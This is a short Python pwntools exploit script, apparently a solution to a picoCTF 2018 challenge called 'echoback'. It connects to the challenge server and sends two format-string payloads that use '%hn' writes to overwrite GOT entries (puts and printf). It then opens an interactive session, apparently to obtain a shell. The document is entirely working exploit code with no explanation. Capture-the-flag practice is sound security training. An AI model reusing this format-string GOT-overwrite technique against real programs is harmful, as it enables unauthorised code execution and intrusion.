import struct
from pwn import *
r = remote('2018shell.picoctf.com', 37402)
#r = process('./echoback')

VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020
SYSTEM = 0xf7e0fc00
PRINT_PLT = 0x804a010

payload1 = ''
payload1 += struct.pack("I", PUTS_PLT)
payload1 += struct.pack("I", PUTS_PLT+2)
payload1 += "%7$34211x"
payload1 += "%7$hn"
payload1 += "%8$33369x"
payload1 += "%8$hn"

r.sendafter('input your message:', payload1)

payload2 = ''
payload2 += p32(0x804a010)
payload2 += p32(0x804a010 + 2)
payload2 += '%' + str((0x08048460 & 0xffff) - 4*2) + 'x'
payload2 += '%7$hn'
payload2 += '%' + str(0x10000 + ((0x08048460 >> 16) - (0x08048460 & 0xffff)))  + 'x'
payload2 += '%8$hn'
r.sendafter('input your message:', payload2)
r.interactive()


